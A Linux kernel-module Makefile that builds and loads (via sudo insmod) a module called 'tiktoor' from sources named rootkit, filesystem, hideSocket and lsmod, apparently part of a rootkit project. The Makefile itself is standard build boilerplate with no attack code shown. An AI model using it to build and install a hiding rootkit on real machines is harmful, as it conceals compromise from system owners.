TARGET=tiktoor

# If KERNELRELEASE is defined, we've been invoked from the kernel build system and can use its language.
ifneq ($(KERNELRELEASE),)
	obj-m := $(TARGET).o
	$(TARGET)-objs := rootkit.o filesystem.o hideSocket.o lsmod.o jiffieez.o

# Otherwise we were called directly from the command line; invoke the kernel build system.
else
	KERNELDIR ?= /lib/modules/$(shell uname -r)/build
	PWD := $(shell pwd)

default:
	$(MAKE) -C $(KERNELDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KERNELDIR) M=$(PWD) clean

install:
	sudo insmod $(TARGET).ko

remove:
	sudo rmmod $(TARGET)

endif

